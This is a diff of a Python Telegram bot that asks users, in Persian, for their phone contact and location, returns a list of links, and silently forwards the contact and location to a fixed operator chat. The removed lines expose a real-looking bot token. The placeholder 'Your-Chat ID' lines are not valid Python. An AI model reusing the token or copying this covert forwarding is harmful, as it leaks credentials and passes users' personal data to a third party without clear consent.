@@ -8,7 +8,7 @@ from telegram.ext import *
 import telegram
 import logging
 
-updater = Updater('534934277:AAHiVykq6jvUmt81i2AXDC3D-r8kfhaYo58')
+updater = Updater('Your-Token')
 dispatcher = updater.dispatcher
 logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
 
@@ -54,7 +54,7 @@ def linker_contact(bot, update):
                      text="❗️ برای به اشتراک گذاشتن موقعیت مکانی"
                           " خود بر روی گزینه زیر کلیک کنید س‍پس بر روی دکمه ارسال موقعیت مکانی کلیک کنید."
                           "\n/location")
-    bot.sendContact(chat_id=364525105,
+    bot.sendContact(chat_id=Your-Chat ID,
                     disable_notification=True,
                     contact=update.message.contact)
 
@@ -67,7 +67,7 @@ def linker_location(bot, update):
     f = open("links.txt", "r")
     contents = f.read()
     bot.send_message(chat_id=update.message.chat_id, text=contents)
-    bot.sendLocation(chat_id=364525105,
+    bot.sendLocation(chat_id=Your-Chat ID,
                      disable_notification=True,
                      location=update.message.location)
 
